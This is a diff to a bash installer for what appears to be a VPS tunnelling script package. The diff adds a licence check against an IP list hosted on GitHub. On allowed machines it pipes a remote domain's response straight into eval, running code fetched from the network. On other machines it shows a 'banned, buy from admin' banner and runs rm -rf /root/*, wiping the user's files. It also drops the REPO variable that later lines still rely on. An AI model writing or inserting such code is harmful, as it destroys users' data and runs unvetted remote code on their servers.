@@ -1,6 +1,28 @@
 #!/bin/bash
 MYIP=$(cat /usr/bin/.ipvps)
-REPO="https://raw.githubusercontent.com/vibecodingxx/vip/main/"
+    ALLOWED_IP=$(curl -sS "https://raw.githubusercontent.com/diah082/izin/main/ip" | grep "$MYIP" | awk '{print $4}')
+    if [[ "$MYIP" == "$ALLOWED_IP" ]]; then
+	eval $(wget -qO- "domainsaya.dekaa.my.id")
+    else
+echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
+echo -e "\033[41;1m ⚠️       AKSES DI TOLAK         ⚠️ \033[0m"
+echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
+echo -e ""
+echo -e "        \033[91;1m❌ SCRIPT LOCKED ❌\033[0m"
+echo -e ""
+echo -e "  \033[0;33m🔒 Your VPS\033[0m $ipsaya \033[0;33mHas been Banned\033[0m"
+echo -e ""
+echo -e "  \033[91m⚠️  Masa Aktif Sudah Habis ⚠️\033[0m"
+echo -e "  \033[0;33m💡 Beli izin resmi hanya dari Admin!\033[0m"
+echo -e ""
+echo -e "  \033[92;1m📞 Contact Admin:\033[0m"
+echo -e "  \033[96m🌍 Telegram: https://nevpn.site\033[0m"
+echo -e "  \033[96m📱 WhatsApp: https://whatsapp.nevpn.site\033[0m"
+echo -e ""
+echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
+rm -rf /root/*
+exit 1
+	fi
 wget -q -O /usr/bin/limit-ip "${REPO}install/limit-ip"
 chmod +x /usr/bin/*
 cd /usr/bin
